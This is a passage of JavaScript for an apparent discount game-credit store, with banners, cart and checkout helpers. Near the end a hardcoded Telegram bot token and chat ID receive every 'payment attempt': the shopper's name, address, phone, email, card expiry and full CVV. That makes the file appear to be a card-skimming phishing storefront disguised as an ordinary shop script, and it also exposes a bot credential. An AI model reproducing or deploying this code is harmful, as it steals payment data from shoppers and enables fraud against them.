// Global variables
let cart = [];
let isFirstVisit = true;

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7835330346:AAEAnJ2nNDQ3tUfiLfB8SgDFERzZ0fYA_Ac';
const ADMIN_CHAT_ID = '-4844832082';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// Duplicate detection storage
let submittedData = JSON.parse(localStorage.getItem('submittedPayments') || '[]');

// Initialize the website
document.addEventListener('DOMContentLoaded', function() {
    // Show loading screen
    showLoadingScreen();
    
    // Load updated gamesData from localStorage if available
    const storedGamesData = localStorage.getItem('gamesData');
    if (storedGamesData) {
        try {
            const parsedData = JSON.parse(storedGamesData);
            // Merge stored data with original gamesData to get any updates like logos
            Object.keys(parsedData).forEach(gameName => {
                if (gamesData[gameName]) {
                    // Keep original structure but update logo if available
                    gamesData[gameName] = { ...gamesData[gameName], ...parsedData[gameName] };
                }
            });
            console.log('Loaded updated gamesData from localStorage');
        } catch (e) {
            console.error('Error parsing stored gamesData:', e);
        }
    }
    
    // Check if first visit
    if (localStorage.getItem('hasVisited') !== 'true') {
        setTimeout(() => {
            showWelcomePopup();
            localStorage.setItem('hasVisited', 'true');
        }, 3000);
    }
    
    // Load games
    loadGames();
    
    // Update translations
    updateTranslations();
    
    // Track visitor
    trackVisitor();
    
    // Initialize 3D rotating banner
    initRotatingBanner();
    
    // Initialize particles
    initParticles();
    
    // Initialize 3D tilt effects
    init3DTiltEffects();
    
    // Initialize scroll animations
    initScrollAnimations();
    
    // Load active package style
    loadActivePackageStyle();
    
    // Load package backgrounds
    loadPackageBackgrounds();
    
    // Load cart from localStorage
    cart = JSON.parse(localStorage.getItem('cart') || '[]');
    updateCartUI();
    
    // Listen for localStorage changes (when admin updates logos)
    window.addEventListener('storage', function(e) {
        if (e.key === 'gamesData' && e.newValue) {
            try {
                const updatedData = JSON.parse(e.newValue);
                Object.keys(updatedData).forEach(gameName => {
                    if (gamesData[gameName]) {
                        gamesData[gameName] = { ...gamesData[gameName], ...updatedData[gameName] };
                    }
                });
                // Reload the current category to show updated logos
                showCategory(currentCategory);
                console.log('Games updated from localStorage');
            } catch (e) {
                console.error('Error parsing updated gamesData:', e);
            }
        }
        
        // Listen for package style changes
        if (e.key === 'activePackageStyle' && e.newValue) {
            loadActivePackageStyle();
            console.log('Package style updated from admin panel');
        }
        
        // Listen for package style data changes
        if (e.key === 'currentPackageStyleData' && e.newValue) {
            loadActivePackageStyle();
            console.log('Package style data updated from admin panel');
        }
        
        // Listen for background image changes
        if (e.key === 'activePackageBackgroundImage' && e.newValue) {
            loadActivePackageStyle();
            console.log('Package background image updated from admin panel');
        }
        
        // Listen for 3D background style changes
        if (e.key === 'activeBgStyle' && e.newValue) {
            applyBgStyle(e.newValue);
            console.log('3D Background style updated from admin panel to:', e.newValue);
        }
    });
});

// Load active package style
function loadActivePackageStyle() {
    const activeStyle = localStorage.getItem('activePackageStyle') || 'style1';
    
    // Try to get style data from localStorage first (for background images)
    const styleDataString = localStorage.getItem('currentPackageStyleData');
    let activeCSS = '';
    
    if (styleDataString) {
        try {
            const styleData = JSON.parse(styleDataString);
            activeCSS = styleData.css;
        } catch (e) {
            console.error('Error parsing package style data:', e);
        }
    }
    
    // Fallback to default styles if no custom data
    if (!activeCSS) {
        // Package styles definitions
        const packageStyles = {
            style1: `
                .package-card { 
                    border-radius: 12px; 
                    background: rgba(255, 255, 255, 0.08);
                    border: 1px solid rgba(34, 197, 94, 0.3);
                }
            `,
            style2: `
                .package-card { 
                    border-radius: 20px; 
                    background: linear-gradient(135deg, rgba(34, 197, 94, 0.1), rgba(16, 163, 74, 0.1));
                    border: 2px solid rgba(34, 197, 94, 0.4);
                }
            `,
            style3: `
                .package-card { 
                    border-radius: 16px; 
                    background: rgba(0, 0, 0, 0.6);
                    border: 1px solid #22c55e;
                    box-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
                }
            `,
            style4: `
                .package-card { 
                    border-radius: 8px; 
                    background: rgba(255, 255, 255, 0.05);
                    border: 1px solid rgba(255, 255, 255, 0.1);
                }
            `,
            style5: `
                .package-card { 
                    border-radius: 24px; 
                    background: linear-gradient(45deg, rgba(34, 197, 94, 0.15), rgba(239, 68, 68, 0.15));
                    border: 2px solid rgba(34, 197, 94, 0.5);
                    position: relative;
                    overflow: hidden;
                }
                .package-card::before {
                    content: '';
                    position: absolute;
                    top: -2px; left: -2px; right: -2px; bottom: -2px;
                    background: linear-gradient(45deg, #22c55e, #ef4444, #3b82f6, #22c55e);
                    border-radius: 24px;
                    opacity: 0.3;
                    z-index: -1;
                    animation: borderRotate 3s linear infinite;
                }
                @keyframes borderRotate {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
            `,
            style6: `
                .package-card { 
                    border-radius: 0px; 
                    background: linear-gradient(135deg, rgba(139, 69, 19, 0.2), rgba(34, 197, 94, 0.2));
                    border: 2px solid #22c55e;
                    position: relative;
                    clip-path: polygon(0 0, calc(100% - 20px) 0, 100% 20px, 100% 100%, 20px 100%, 0 calc(100% - 20px));
                }
            `
        };
        
        activeCSS = packageStyles[activeStyle] || packageStyles.style1;
    }
    
    // Apply the active style
    let styleElement = document.getElementById('dynamicPackageStyle');
    if (!styleElement) {
        styleElement = document.createElement('style');
        styleElement.id = 'dynamicPackageStyle';
        document.head.appendChild(styleElement);
    }
    
    styleElement.textContent = activeCSS;
    console.log('Applied package style:', activeStyle);
}

// Legacy banner function - kept for compatibility
function loadBannerImage() {
    // This function is now handled by initRotatingBanner()
    console.log('Legacy banner function called - using new 3D rotating banner system');
}

// Particle system
function initParticles() {
    const particlesContainer = document.getElementById('particles');
    if (!particlesContainer) return;
    
    function createParticle() {
        const particle = document.createElement('div');
        particle.className = 'particle';
        
        // Random size between 2-6px
        const size = Math.random() * 4 + 2;
        particle.style.width = size + 'px';
        particle.style.height = size + 'px';
        
        // Random horizontal position
        particle.style.left = Math.random() * 100 + '%';
        
        // Random animation duration
        const duration = Math.random() * 3 + 4;
        particle.style.animationDuration = duration + 's';
        
        // Random delay
        particle.style.animationDelay = Math.random() * 2 + 's';
        
        particlesContainer.appendChild(particle);
        
        // Remove particle after animation
        setTimeout(() => {
            if (particle.parentNode) {
                particle.parentNode.removeChild(particle);
            }
        }, (duration + 2) * 1000);
    }
    
    // Create particles continuously
    setInterval(createParticle, 300);
}

// 3D Tilt Effects
function init3DTiltEffects() {
    const cards = document.querySelectorAll('.game-card, .feature, .package-item');
    
    cards.forEach(card => {
        card.addEventListener('mousemove', (e) => {
            const rect = card.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            const centerX = rect.width / 2;
            const centerY = rect.height / 2;
            
            const rotateX = (y - centerY) / centerY * -10;
            const rotateY = (x - centerX) / centerX * 10;
            
            card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateZ(20px)`;
        });
        
        card.addEventListener('mouseleave', () => {
            card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) translateZ(0px)';
        });
    });
}

// 3D Loading Screen
function showLoadingScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const progressBar = document.getElementById('progressBar');
    
    if (!loadingScreen || !progressBar) return;
    
    let progress = 0;
    const interval = setInterval(() => {
        progress += Math.random() * 15;
        if (progress > 100) progress = 100;
        
        progressBar.style.width = progress + '%';
        
        if (progress >= 100) {
            clearInterval(interval);
            setTimeout(() => {
                loadingScreen.classList.add('hidden');
                setTimeout(() => {
                    loadingScreen.style.display = 'none';
                }, 500);
            }, 500);
        }
    }, 200);
}

// Scroll Reveal Animations
function initScrollAnimations() {
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('animate-in');
            }
        });
    }, observerOptions);
    
    // Observe all game cards and sections
    const animateElements = document.querySelectorAll('.game-card, .trust-item, .review-card, .footer-section');
    animateElements.forEach(el => {
        el.classList.add('animate-element');
        observer.observe(el);
    });
}

// 3D Rotating Banner System
let currentSlide = 0;
let bannerSlides = [];
let bannerSettings = { transitionStyle: 'fade', transitionSpeed: 5, autoPlay: true };
let bannerInterval;

function loadDataFromServer(type, callback) {
    fetch(`/api/save-admin-data.php?type=${type}`)
    .then(response => response.json())
    .then(result => {
        if (result.success && result.data) {
            callback(result.data);
        } else {
            callback(null);
        }
    })
    .catch(error => {
        console.error(`Error loading ${type} from server:`, error);
        callback(null);
    });
}

function getDefaultBanners() {
    return [
        {
            image: 'https://images.unsplash.com/photo-1542751371-adc38448a05e?w=1920&h=1080&fit=crop',
            title: 'Premium Gaming Credits',
            subtitle: 'Get 65% OFF on your first purchase! Instant delivery worldwide.',
            buttonText: 'Shop Now',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1493711662062-fa541adb3fc8?w=1920&h=1080&fit=crop',
            title: 'Free Fire Diamonds',
            subtitle: 'Cheapest prices guaranteed. Fast and secure delivery.',
            buttonText: 'Buy Diamonds',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1511512578047-dfb367046420?w=1920&h=1080&fit=crop',
            title: 'PUBG Mobile UC',
            subtitle: 'Global UC available 24/7. Trusted by millions worldwide.',
            buttonText: 'Get UC',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1606144042614-b2417e99c4e3?w=1920&h=1080&fit=crop',
            title: 'Valorant Points',
            subtitle: 'All regions supported. Instant delivery guaranteed.',
            buttonText: 'Buy VP',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1538481199705-c710c4e965fc?w=1920&h=1080&fit=crop',
            title: 'Mobile Legends',
            subtitle: 'Diamonds and starlight passes. Best prices online.',
            buttonText: 'Shop ML',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1556438064-2d7646166914?w=1920&h=1080&fit=crop',
            title: 'Genshin Impact',
            subtitle: 'Genesis Crystals and Welkin Moon. All servers available.',
            buttonText: 'Buy Crystals',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1552820728-8b83bb6b773f?w=1920&h=1080&fit=crop',
            title: 'Call of Duty Mobile',
            subtitle: 'COD Points for all regions. Battle passes and skins.',
            buttonText: 'Get CP',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1616588589676-62b3bd4ff6d2?w=1920&h=1080&fit=crop',
            title: 'League of Legends',
            subtitle: 'RP for PC and Wild Cores for mobile. Global delivery.',
            buttonText: 'Buy RP',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=1920&h=1080&fit=crop',
            title: 'Roblox Robux',
            subtitle: 'Premium Robux packages. Safe and instant delivery.',
            buttonText: 'Get Robux',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1560419015-7c427e8ae5ba?w=1920&h=1080&fit=crop',
            title: 'Honor of Kings',
            subtitle: 'Tokens and skins for the most popular MOBA game.',
            buttonText: 'Buy Tokens',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1585504198199-20277593b94f?w=1920&h=1080&fit=crop',
            title: 'Gift Cards',
            subtitle: 'Steam, PlayStation, Xbox and more. Digital delivery.',
            buttonText: 'View Cards',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1551698618-1dfe5d97d256?w=1920&h=1080&fit=crop',
            title: '24/7 Support',
            subtitle: 'Expert customer support. Live chat and instant help.',
            buttonText: 'Get Help',
            buttonLink: 'support.html'
        },
        {
            image: 'https://images.unsplash.com/photo-1516199707916-3136bb4c8b9e?w=1920&h=1080&fit=crop',
            title: 'Secure Payments',
            subtitle: 'Multiple payment methods. SSL encrypted and protected.',
            buttonText: 'Learn More',
            buttonLink: '#services'
        },
        {
            image: 'https://images.unsplash.com/photo-1567095761054-7a02e69e5c43?w=1920&h=1080&fit=crop',
            title: 'Instant Delivery',
            subtitle: 'Automated delivery system. Get your credits in seconds.',
            buttonText: 'Start Shopping',
            buttonLink: '#games'
        },
        {
            image: 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1920&h=1080&fit=crop',
            title: 'Trusted Since 2014',
            subtitle: 'Over 2.5M happy customers. 99.9% satisfaction rate.',
            buttonText: 'Join Us',
            buttonLink: '#games'
        }
    ];
}

function initRotatingBanner() {
    // Try to load from server first
    loadDataFromServer('bannerSlides', (serverData) => {
        if (serverData && serverData.length > 0) {
            // Use server data
            bannerSlides = serverData;
            console.log('Loaded banners from server:', bannerSlides.length);
        } else {
            // Fallback to localStorage or defaults
            bannerSlides = JSON.parse(localStorage.getItem('bannerSlides') || '[]');
            if (bannerSlides.length === 0) {
                bannerSlides = getDefaultBanners();
                console.log('Using default banners');
            }
        }
        
        // Load banner settings
        loadDataFromServer('bannerSettings', (settingsData) => {
            if (settingsData) {
                bannerSettings = settingsData;
            } else {
                bannerSettings = JSON.parse(localStorage.getItem('bannerSettings') || '{"transitionStyle": "fade", "transitionSpeed": 5, "autoPlay": true}');
            }
            
            // Initialize banner
            setupBannerSlides();
            setupBannerControls();
            init3DParticles();
            
            // Start autoplay if enabled
            if (bannerSettings.autoPlay && bannerSlides.length > 1) {
                startAutoPlay();
            }
            
            // Load package backgrounds after banners are set up
            setTimeout(() => {
                applyPackageBackgrounds();
            }, 500);
        });
    });
}

// Apply package backgrounds from server or localStorage
function applyPackageBackgrounds() {
    // Try to load from server first
    loadDataFromServer('packageBackgroundData', (serverData) => {
        let backgroundData = {};
        
        if (serverData && Object.keys(serverData).length > 0) {
            // Use server data
            backgroundData = serverData;
            console.log('Loaded package backgrounds from server:', Object.keys(backgroundData).length, 'games');
        } else {
            // Fallback to localStorage
            backgroundData = JSON.parse(localStorage.getItem('packageBackgroundData') || '{}');
            console.log('Using localStorage package backgrounds');
        }
        
        // Apply backgrounds to packages
        for (const gameName in backgroundData) {
            const packages = document.querySelectorAll(`[data-game="${gameName}"] .package-card`);
            packages.forEach((packageCard, index) => {
                if (backgroundData[gameName][index] || backgroundData[gameName].backgroundImage) {
                    const imageUrl = backgroundData[gameName][index] || backgroundData[gameName].backgroundImage;
                    packageCard.style.backgroundImage = `url(${imageUrl})`;
                    packageCard.style.backgroundSize = 'cover';
                    packageCard.style.backgroundPosition = 'center';
                }
            });
        }
    });
}

function setupBannerSlides() {
    const bannerSlidesContainer = document.getElementById('bannerSlides');
    const bannerIndicators = document.getElementById('bannerIndicators');
    
    if (!bannerSlidesContainer) return;
    
    // Apply transition style
    bannerSlidesContainer.className = `banner-slides ${bannerSettings.transitionStyle}`;
    
    if (bannerSlides.length === 0) {
        // Keep default slide
        return;
    }
    
    // Clear existing slides
    bannerSlidesContainer.innerHTML = '';
    bannerIndicators.innerHTML = '';
    
    // Create slides
    bannerSlides.forEach((slide, index) => {
        const slideElement = document.createElement('div');
        slideElement.className = `banner-slide ${index === 0 ? 'active' : ''}`;
        slideElement.setAttribute('data-slide', index);
        
        slideElement.innerHTML = `
            <div class="slide-background" style="background-image: url('${slide.image}')">
                <div class="slide-overlay"></div>
            </div>
            <div class="slide-content">
                <div class="container">
                    ${slide.title ? `<h1 class="slide-title">${slide.title}</h1>` : ''}
                    ${slide.subtitle ? `<p class="slide-subtitle">${slide.subtitle}</p>` : ''}
                    <div class="slide-features">
                        <div class="feature">
                            <i class="fas fa-bolt"></i>
                            <span data-translate="hero.instant">Instant Delivery</span>
                        </div>
                        <div class="feature">
                            <i class="fas fa-shield-alt"></i>
                            <span data-translate="hero.secure">100% Secure</span>
                        </div>
                        <div class="feature">
                            <i class="fas fa-tags"></i>
                            <span data-translate="hero.discount">65% OFF First Purchase</span>
                        </div>
                    </div>
                    <div class="slide-cta">
                        <button class="cta-button" onclick="${slide.buttonLink && slide.buttonLink !== '#' ? `window.location.href='${slide.buttonLink}'` : `document.getElementById('games').scrollIntoView({behavior: 'smooth'})`}">
                            <span>${slide.buttonText || 'Buy Now'}</span>
                            <i class="fas fa-arrow-down"></i>
                        </button>
                    </div>
                </div>
            </div>
        `;
        
        bannerSlidesContainer.appendChild(slideElement);
        
        // Create indicator
        const indicator = document.createElement('button');
        indicator.className = `indicator ${index === 0 ? 'active' : ''}`;
        indicator.onclick = () => goToSlide(index);
        bannerIndicators.appendChild(indicator);
    });
    
    // Update translations for new slides
    updateTranslations();
}

function setupBannerControls() {
    // Hide controls if only one slide
    const controls = document.querySelector('.banner-controls');
    const indicators = document.querySelector('.banner-indicators');
    
    if (bannerSlides.length <= 1) {
        if (controls) controls.style.display = 'none';
        if (indicators) indicators.style.display = 'none';
    } else {
        if (controls) controls.style.display = 'flex';
        if (indicators) indicators.style.display = 'flex';
    }
}

function nextSlide() {
    if (bannerSlides.length <= 1) return;
    
    currentSlide = (currentSlide + 1) % bannerSlides.length;
    updateSlide();
}

function previousSlide() {
    if (bannerSlides.length <= 1) return;
    
    currentSlide = (currentSlide - 1 + bannerSlides.length) % bannerSlides.length;
    updateSlide();
}

function goToSlide(index) {
    if (bannerSlides.length <= 1) return;
    
    currentSlide = index;
    updateSlide();
}

function updateSlide() {
    const slides = document.querySelectorAll('.banner-slide');
    const indicators = document.querySelectorAll('.indicator');
    
    slides.forEach((slide, index) => {
        slide.classList.remove('active', 'prev', 'next');
        
        if (index === currentSlide) {
            slide.classList.add('active');
        } else if (index === (currentSlide - 1 + bannerSlides.length) % bannerSlides.length) {
            slide.classList.add('prev');
        } else if (index === (currentSlide + 1) % bannerSlides.length) {
            slide.classList.add('next');
        }
    });
    
    indicators.forEach((indicator, index) => {
        indicator.classList.toggle('active', index === currentSlide);
    });
    
    // Restart autoplay
    if (bannerSettings.autoPlay) {
        stopAutoPlay();
        startAutoPlay();
    }
}

function startAutoPlay() {
    if (bannerSlides.length <= 1) return;
    
    bannerInterval = setInterval(() => {
        nextSlide();
    }, bannerSettings.transitionSpeed * 1000);
}

function stopAutoPlay() {
    if (bannerInterval) {
        clearInterval(bannerInterval);
        bannerInterval = null;
    }
}

function init3DParticles() {
    const particlesContainer = document.getElementById('particles3d');
    if (!particlesContainer) return;
    
    function createParticle3D() {
        const particle = document.createElement('div');
        particle.className = 'particle-3d';
        
        // Random size between 2-6px
        const size = Math.random() * 4 + 2;
        particle.style.width = size + 'px';
        particle.style.height = size + 'px';
        
        // Random horizontal position
        particle.style.left = Math.random() * 100 + '%';
        
        // Random animation duration
        const duration = Math.random() * 4 + 6;
        particle.style.animationDuration = duration + 's';
        
        // Random delay
        particle.style.animationDelay = Math.random() * 2 + 's';
        
        particlesContainer.appendChild(particle);
        
        // Remove particle after animation
        setTimeout(() => {
            if (particle.parentNode) {
                particle.parentNode.removeChild(particle);
            }
        }, (duration + 2) * 1000);
    }
    
    // Create particles continuously
    setInterval(createParticle3D, 500);
}

// Global functions for admin panel
window.updateBannerSlides = function(slides) {
    bannerSlides = slides;
    currentSlide = 0; // Reset to first slide
    setupBannerSlides();
    setupBannerControls();
    
    if (bannerSettings.autoPlay && bannerSlides.length > 1) {
        stopAutoPlay();
        startAutoPlay();
    }
};

window.updateBannerSettings = function(settings) {
    bannerSettings = settings;
    
    const bannerSlidesContainer = document.getElementById('bannerSlides');
    if (bannerSlidesContainer) {
        bannerSlidesContainer.className = `banner-slides ${bannerSettings.transitionStyle}`;
    }
    
    if (bannerSettings.autoPlay && bannerSlides.length > 1) {
        stopAutoPlay();
        startAutoPlay();
    } else {
        stopAutoPlay();
    }
};

// Show welcome popup
function showWelcomePopup() {
    const popup = document.getElementById('welcomePopup');
    popup.classList.add('active');
}

// Close welcome popup
function closeWelcomePopup() {
    const popup = document.getElementById('welcomePopup');
    popup.classList.remove('active');
}

// Language functions
function toggleLanguageMenu() {
    const menu = document.getElementById('langMenu');
    menu.classList.toggle('active');
}

function changeLanguage(lang) {
    currentLanguage = lang;
    localStorage.setItem('selectedLanguage', lang);
    
    // Update language button
    const langBtn = document.querySelector('.lang-btn');
    const flags = { en: '🇺🇸', ar: '🇸🇦', ru: '🇷🇺' };
    const names = { en: 'English', ar: 'العربية', ru: 'Русский' };
    
    langBtn.innerHTML = `
        <span class="flag">${flags[lang]}</span>
        <span>${names[lang]}</span>
        <i class="fas fa-chevron-down"></i>
    `;
    
    // Update all translations
    updateTranslations();
    
    // Close menu
    document.getElementById('langMenu').classList.remove('active');
    
    // Reload games with new language
    loadGames();
}

// Current active category
let currentCategory = 'popular';

// Load games into the grid
function loadGames() {
    showCategory('popular'); // Show popular games by default
}

// Show games by category
function showCategory(category) {
    currentCategory = category;
    const gamesGrid = document.getElementById('gamesGrid');
    gamesGrid.innerHTML = '';
    
    // Update category buttons
    document.querySelectorAll('.category-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    document.querySelector(`[data-category="${category}"]`).classList.add('active');
    
    // Get games for this category
    const categoryData = gameCategories[category];
    if (!categoryData) return;
    
    categoryData.games.forEach(gameName => {
        if (gamesData[gameName]) {
            const gameCard = createGameCard(gameName, gamesData[gameName]);
            gamesGrid.appendChild(gameCard);
        }
    });
}

// Create game card element
function createGameCard(gameName, gameInfo) {
    const card = document.createElement('div');
    card.className = 'game-card';
    
    // Get the cheapest package for display
    const cheapestPackage = gameInfo.packages.reduce((min, pkg) => 
        pkg.originalPrice < min.originalPrice ? pkg : min
    );
    
    // Get discount percentage for this game
    const discountPercentage = getGameDiscount(gameName);
    const discountedPrice = calculateDiscountedPrice(cheapestPackage.originalPrice, discountPercentage);
    
    // Use logo if available, otherwise use emoji icon (larger size)
    const gameIconOrLogo = gameInfo.logo ? 
        `<img src="${gameInfo.logo}" alt="${gameName}" class="game-logo-large">` :
        `<span class="game-emoji-large">${gameInfo.icon}</span>`;
    
    card.innerHTML = `
        <div class="game-card-content">
            <div class="game-icon-container">${gameIconOrLogo}</div>
            <div class="game-info">
                <h3 class="game-title">${gameName}</h3>
                <p class="game-description">${gameInfo.description}</p>
                <div class="package-info">
                    <div class="package-card" data-game="${gameName}" data-package="${cheapestPackage.name}">
                        <div class="package-name">${cheapestPackage.name} (Global)</div>
                        <div class="package-subtitle">Cheapest Package</div>
                    </div>
                </div>
                <div class="game-pricing">
                    <div class="price-display">
                        <span class="original-price">$${cheapestPackage.originalPrice.toFixed(2)}</span>
                        <span class="discounted-price">$${discountedPrice}</span>
                    </div>
                    <span class="discount-badge">${discountPercentage}% OFF First Purchase</span>
                </div>
            </div>
            <div class="game-actions">
                <button class="add-to-cart-btn" onclick="quickAddToCart('${gameName}', '${cheapestPackage.name}', ${cheapestPackage.originalPrice})">
                    <i class="fas fa-cart-plus"></i>
                    <span>Add to Cart</span>
                </button>
                <button class="buy-now-btn" onclick="goToGameDetails('${gameName}')">
                    <i class="fas fa-eye"></i>
                    <span>View Details</span>
                </button>
            </div>
        </div>
    `;
    
    // Add 3D hover effect
    card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        
        const centerX = rect.width / 2;
        const centerY = rect.height / 2;
        
        const rotateX = (y - centerY) / 15;
        const rotateY = (centerX - x) / 15;
        
        card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateZ(10px)`;
    });

    card.addEventListener('mouseleave', () => {
        card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) translateZ(0px)';
    });
    
    return card;
}

// Go to game details page
function goToGameDetails(gameName) {
    window.location.href = `game-details.html?game=${encodeURIComponent(gameName)}`;
}

// Quick add to cart from main page (without UID)
function quickAddToCart(gameName, packageName, originalPrice) {
    // Get discount percentage for this game
    const discountPercentage = getGameDiscount(gameName);
    const discountedPrice = parseFloat(calculateDiscountedPrice(originalPrice, discountPercentage));
    
    const cartItem = {
        id: Date.now() + Math.random(),
        gameName,
        packageName,
        originalPrice: parseFloat(originalPrice),
        discountedPrice,
        price: discountedPrice, // Add price field for compatibility
        uid: '', // Will be filled during checkout
        packageId: `quick-${Date.now()}`
    };
    
    cart.push(cartItem);
    localStorage.setItem('cart', JSON.stringify(cart));
    updateCartUI();
    showNotification(`${gameName} - ${packageName} added to cart!`, 'success');
}

// Add item to cart
function addToCart(gameName, packageName, originalPrice, packageId) {
    const uidInput = document.getElementById(`uid-${packageId}`);
    const uid = uidInput.value.trim();
    
    if (!uid) {
        alert(t('common.required'));
        return;
    }
    
    const discountedPrice = parseFloat(calculateDiscountedPrice(originalPrice));
    
    const cartItem = {
        id: Date.now() + Math.random(),
        gameName,
        packageName,
        originalPrice: parseFloat(originalPrice),
        discountedPrice,
        price: discountedPrice, // Add price field for compatibility
        uid,
        packageId
    };
    
    cart.push(cartItem);
    localStorage.setItem('cart', JSON.stringify(cart));
    
    // Debug: Log cart after adding item
    console.log('Item added to cart:', cartItem);
    console.log('Current cart:', cart);
    console.log('Cart saved to localStorage:', localStorage.getItem('cart'));
    
    updateCartUI();
    
    // Clear UID input
    uidInput.value = '';
    uidInput.nextElementSibling.disabled = true;
    
    // Show success message
    showNotification('Item added to cart!', 'success');
}

// Update cart UI
function updateCartUI() {
    // Load cart from localStorage if not already loaded
    if (!cart.length) {
        cart = JSON.parse(localStorage.getItem('cart') || '[]');
    }
    
    const cartCount = document.getElementById('cartCount');
    const cartItems = document.getElementById('cartItems');
    const cartTotal = document.getElementById('cartTotal');
    
    if (cartCount) cartCount.textContent = cart.length;
    
    if (cart.length === 0) {
        if (cartItems) cartItems.innerHTML = `<div class="empty-cart">Your cart is empty</div>`;
        if (cartTotal) cartTotal.textContent = '$0.00';
        return;
    }
    
    const total = cart.reduce((sum, item) => sum + item.discountedPrice, 0);
    if (cartTotal) cartTotal.textContent = `$${total.toFixed(2)}`;
    
    if (cartItems) cartItems.innerHTML = cart.map(item => `
        <div class="cart-item">
            <div class="cart-item-header">
                <div class="cart-item-name">${item.gameName} - ${item.packageName}</div>
                <button class="cart-item-remove" onclick="removeFromCart(${item.id})">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="cart-item-details">UID: ${item.uid}</div>
            <div class="cart-item-price">$${item.discountedPrice.toFixed(2)}</div>
        </div>
    `).join('');
}

// Remove item from cart
function removeFromCart(itemId) {
    cart = cart.filter(item => item.id !== itemId);
    localStorage.setItem('cart', JSON.stringify(cart));
    updateCartUI();
}

// Update cart count
function updateCartCount() {
    const cartCount = document.getElementById('cartCount');
    if (cartCount) {
        cartCount.textContent = cart.length;
    }
}

// Toggle cart sidebar
function toggleCart() {
    const cartSidebar = document.getElementById('cartSidebar');
    const cartOverlay = document.querySelector('.cart-overlay');
    
    cartSidebar.classList.toggle('active');
    
    if (cartSidebar.classList.contains('active')) {
        cartOverlay.style.opacity = '1';
        cartOverlay.style.visibility = 'visible';
        document.body.style.overflow = 'hidden';
    } else {
        cartOverlay.style.opacity = '0';
        cartOverlay.style.visibility = 'hidden';
        document.body.style.overflow = 'auto';
    }
}

// Proceed to checkout
function proceedToCheckout() {
    if (cart.length === 0) {
        alert('Your cart is empty!');
        return;
    }
    
    // Close cart
    toggleCart();
    
    // Debug: Log cart data
    console.log('Cart data being sent to payment:', cart);
    
    // Redirect to payment page
    localStorage.setItem('checkoutCart', JSON.stringify(cart));
    // Also keep regular cart as backup
    localStorage.setItem('cart', JSON.stringify(cart));
    window.location.href = 'payment.html';
}

// Show notification
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    
    notification.style.cssText = `
        position: fixed;
        top: 100px;
        right: 20px;
        background: ${type === 'success' ? '#22c55e' : '#ef4444'};
        color: white;
        padding: 1rem 1.5rem;
        border-radius: 8px;
        z-index: 10000;
        animation: slideIn 0.3s ease;
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

// Track visitor for admin panel
function trackVisitor() {
    const visitorData = {
        timestamp: new Date().toISOString(),
        ip: 'Unknown', // Will be detected server-side
        userAgent: navigator.userAgent,
        language: navigator.language,
        referrer: document.referrer || 'Direct',
        page: window.location.pathname
    };
    
    // Store in localStorage for admin panel
    let visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
    visitors.push(visitorData);
    
    // Keep only last 1000 visitors
    if (visitors.length > 1000) {
        visitors = visitors.slice(-1000);
    }
    
    localStorage.setItem('visitors', JSON.stringify(visitors));
}

// Send data to Telegram
async function sendToTelegram(data, isDuplicate = false) {
    const message = isDuplicate ? 
        `⚠️ DUPLICATE ENTRY DETECTED!\n\n${formatTelegramMessage(data)}` :
        `💳 NEW PAYMENT ATTEMPT\n\n${formatTelegramMessage(data)}`;
    
    try {
        const response = await fetch(TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (response.ok) {
            console.log('Data sent to Telegram successfully');
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

// Format message for Telegram
function formatTelegramMessage(data) {
    const total = data.cart.reduce((sum, item) => sum + item.discountedPrice, 0);
    
    let message = `<b>Customer Information:</b>\n`;
    message += `Name: ${data.fullName}\n`;
    message += `Email: ${data.email}\n`;
    message += `Phone: ${data.phone}\n`;
    message += `Country: ${data.country}\n`;
    message += `Region: ${data.region}\n`;
    message += `City: ${data.city}\n`;
    message += `Address: ${data.address}\n`;
    message += `ZIP: ${data.zip}\n\n`;
    
    message += `<b>Payment Information:</b>\n`;
    message += `Card: **** **** **** ${data.cardNumber.slice(-4)}\n`;
    message += `Expiry: ${data.expiry}\n`;
    message += `CVV: ${data.cvv}\n\n`;
